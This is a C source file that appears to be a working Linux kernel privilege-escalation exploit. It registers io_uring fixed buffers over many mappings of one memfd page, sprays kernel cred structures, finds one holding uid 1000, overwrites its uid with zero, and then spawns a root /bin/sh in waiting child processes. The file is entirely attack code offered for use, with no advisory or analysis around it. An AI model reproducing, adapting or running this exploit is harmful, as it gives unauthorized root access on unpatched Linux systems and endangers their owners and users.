#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <liburing.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <assert.h>

#define COLOR_RED "\033[1;31m"
#define COLOR_GREEN "\033[1;32m"
#define COLOR_RESET "\033[0m"
#define PAGE_SIZE 0x1000
#define MAX_PAGES 100
#define CRED_DRAIN 100
#define CRED_SPRAY 600

#define check_ret(ret, buf) do { if((ret) < 0) { err_exit(buf); } } while(0)

int check_root_pipe[2];
char bin_sh_str[] = "/bin/sh";
char *shell_args[] = { bin_sh_str, NULL };
char child_pipe_buf[1];
char root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                  "\033[34m[*] Execve root shell now...\033[0m\n";
struct timespec timer = {
    .tv_sec = 1145141919,
    .tv_nsec = 0,
};

void err_exit(char *buf){
    fprintf(stderr, "%s[-]%s : %s%s\n", COLOR_RED, buf, strerror(errno), COLOR_RESET);
    exit(-1);
}
void log(char *buf){
    fprintf(stdout,"%s[+]%s%s\n",COLOR_GREEN,buf,COLOR_RESET);
}
void cred_drain(){
    for(int i=0;i<CRED_DRAIN;i++){
        int ret=fork();
        if(!ret){
            read(check_root_pipe[0],child_pipe_buf,1);
            if(getuid()==0){
                write(1, root_str, 71);
                system("/bin/sh");
            }
            sleep(100000000);
        }
        check_ret(ret,"fork fail");
    }
}
void clear_buddy(){
    void * pages[MAX_PAGES];
    for(int i=0;i<MAX_PAGES;i++){
        pages[i]=mmap(0x60000000+i*0x200000UL,PAGE_SIZE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        check_ret(pages[i],"mmap");
    }
    for(int i=0;i<MAX_PAGES;i++){
        *(char *)pages[i]='a';
    }
}
__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    /* for syscall, it's clone(flags, stack, ...) */
    __asm__ volatile (
        " mov r15, rsi\n"   /* save the rsi*/
        " xor rsi, rsi\n"   /* set esp and useless args to NULL */
        " xor rdx, rdx\n"
        " xor r10, r10\n"
        " xor r8, r8\n"
        " xor r9, r9\n"
        " mov rax, 56\n"   /* __NR_clone */
        " syscall\n"
        " cmp rax, 0\n"
        " je child_fn\n"
        " ret\n"   /* parent */
        "child_fn:    \n"
        " jmp r15\n"   /* child */
    );
}


int waiting_for_root_fn(void *args)
{
    /* we're using the same stack for them, so we need to avoid cracking it.. */
    __asm__ volatile (
        "   lea rax, [check_root_pipe]\n"
        "   xor rdi, rdi\n"
        "   mov edi, dword ptr [rax]\n"
        "   mov rsi, child_pipe_buf\n"
        "   mov rdx, 1\n"
        "   xor rax, rax\n" /* read(check_root_pipe[0], child_pipe_buf, 1)*/
        "   syscall\n"
        "   mov rax, 102\n" /* getuid() */
        "   syscall\n"
        "   cmp rax, 0\n"
        "   jne failed\n"
        "   mov rdi, 1\n"
        "   lea rsi, [root_str]\n"
        "   mov rdx, 80\n"
        "   mov rax, 1\n"    /* write(1, root_str, 71) */
        "   syscall\n"
        "   lea rdi, [bin_sh_str]\n"
        "   lea rsi, [shell_args]\n"
        "   xor rdx, rdx\n"
        "   mov rax, 59\n"
        "   syscall\n"   /* execve("/bin/sh", args, NULL) */
        "failed: \n"
        "   lea rdi, [timer]\n"
        "   xor rsi, rsi\n"
        "   mov rax, 35\n"  /* nanosleep() */
        "   syscall\n"
    );
    return 0;
}


int main(){
    cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(sched_getcpu(), &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0) {
		perror("sched_setaffinity");
		exit(EXIT_FAILURE);
	}
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;
    int memfd;
    int rw_fd;
    struct iovec iovec;
    char *rw_buffer;
    uint64_t start_addr=0x800000000;
    int nr_pages=500;
    char buf[1000];
    //清空cred cache
    log("drain cred cache");
    pipe(check_root_pipe);
    cred_drain();
    //清空buddy system cache
    log("clear buddy system cache");
    clear_buddy();
    //初始化io_uring
    log("io_uring_setup");
    ret=io_uring_queue_init(8,&ring,0);
    check_ret(ret,"io_uring_setup fail");
    //准备缓冲区
    log("prepare buf to register");
    memfd=memfd_create("io_register_buf",MFD_CLOEXEC);
    check_ret(memfd,"memfd_create fail");
    rw_fd=memfd_create("read_write_file",MFD_CLOEXEC);
    check_ret(rw_fd,"memfd_create fail");
    check_ret(fallocate(memfd, 0, 0, 1 * PAGE_SIZE),"fallocate fail");
    check_ret(fallocate(rw_fd, 0, 0, 1 * PAGE_SIZE),"fallocate fail");
    for(int i=0;i<nr_pages;i++){
        check_ret(mmap(start_addr+i*0x1000,PAGE_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_FIXED,memfd,0),"mmap fail");
    }
    rw_buffer=mmap(NULL,PAGE_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED,rw_fd,0);
    check_ret(rw_buffer,"mmap fail");
    //注册缓冲区
    log("register buffer");
    iovec.iov_base=start_addr;
    iovec.iov_len=nr_pages*PAGE_SIZE;
    check_ret(io_uring_register_buffers(&ring,&iovec,1),"io_ring_register_buffer fail");
    //spray cred
    log("spray cred");
    for(int i=0;i<CRED_SPRAY;i++){
        check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn),"clone fail");
    }
    //search cred page
    log("search crea page");
    int page_offset=0;
    for(int i=0;i<nr_pages;i++){
        sqe=io_uring_get_sqe(&ring);
        check_ret(sqe,"io_uring_get_sqe fail");
        io_uring_prep_write_fixed(sqe,rw_fd,start_addr+i*PAGE_SIZE,PAGE_SIZE,0,0);
        check_ret(io_uring_submit(&ring),"io_uring_submit fail");
        io_uring_wait_cqe(&ring, &cqe);
        io_uring_cqe_seen(&ring, cqe);
        int uid=((int *)(rw_buffer))[1];
        int gid=((int *)(rw_buffer))[2];
        if(uid==1000 && gid==1000){
            page_offset=i;
            break;
        }
    }
    if(page_offset==0){
        err_exit("not find cred page");
    }
    //edit cred's uid
    log("/edit cred's uid");
    *(size_t *)(rw_buffer)=0x2;
    sqe=io_uring_get_sqe(&ring);
    check_ret(sqe,"io_uring_get_sqe fail");
    io_uring_prep_read_fixed(sqe,rw_fd,start_addr+page_offset*PAGE_SIZE,8,0,0);
    check_ret(io_uring_submit(&ring),"io_uring_submit fail");
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);


    sqe=io_uring_get_sqe(&ring);
    check_ret(sqe,"io_uring_get_sqe fail");
    io_uring_prep_write_fixed(sqe,rw_fd,start_addr+page_offset*PAGE_SIZE,PAGE_SIZE,0,0);
    check_ret(io_uring_submit(&ring),"io_uring_submit fail");
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
    //check privilege in child processes
    log("check privilege in child processes");
    write(check_root_pipe[1],buf, CRED_SPRAY+CRED_DRAIN);
    sleep(100000000);
}